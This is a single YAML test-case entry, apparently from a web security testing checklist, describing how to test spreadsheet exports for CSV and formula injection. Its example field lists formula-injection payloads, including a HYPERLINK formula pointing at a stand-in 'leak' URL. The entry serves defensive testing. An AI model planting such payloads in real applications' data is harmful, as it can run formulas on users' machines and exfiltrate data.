- id: WEB-INJ-023
  sheet: WEB
  category: INJ
  title: Test spreadsheet export for CSV and formula injection
  objective: Finds exported CSV files where a cell beginning with a formula character is evaluated by spreadsheet software.
  preconditions:
  - Do not run on production.
  steps:
  - Identify export features that place untrusted input into CSV, such as reports or audit logs.
  - Enter a value beginning with =, +, -, @, tab or carriage return in an exportable field.
  - Export the file and open it in Excel and in LibreOffice.
  - Save and reopen the file in Excel to check the mitigation survives a round trip.
  example: =1+1 ; +1+1 ; @SUM(1,1) ; =HYPERLINK("http://example.invalid/leak?test=1","Click Me") ; separator breakout then =1+1
  expected: No exported cell is interpreted as a formula in Excel or LibreOffice, including after an Excel save and reopen.
  severity: Medium
  test_type: Manual
  level: ASVS L3
  refs:
    wstg:
    - WSTG-INJT-21
    asvs:
    - V1.2.10
    cwe:
